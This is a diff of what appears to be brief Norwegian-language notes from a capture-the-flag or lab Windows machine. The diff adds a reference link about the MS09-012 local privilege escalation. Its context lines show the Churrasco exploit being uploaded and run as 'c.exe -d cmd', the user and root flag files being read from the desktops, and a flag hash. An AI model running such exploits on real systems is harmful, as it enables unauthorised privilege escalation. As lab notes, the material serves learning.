@@ -42,6 +42,8 @@ put som .txt og move til .exe
 
 last opp [https://github.com/Re4son/Churrasco](https://github.com/Re4son/Churrasco)
 
+http://carnal0wnage.attackresearch.com/2010/05/playing-with-ms09-012-windows-local.html
+
 c.exe -d cmd
 
 type "c:\documents and settings\administrator\desktop\root.txt"
@@ -51,6 +53,4 @@ type "c:\documents and settings\administrator\desktop\root.txt"
 type "c:\documents and settings\lakis\desktop\user.txt"
 
 **700c5dc163014e22b3e408f8703f67d1**
-
-
 
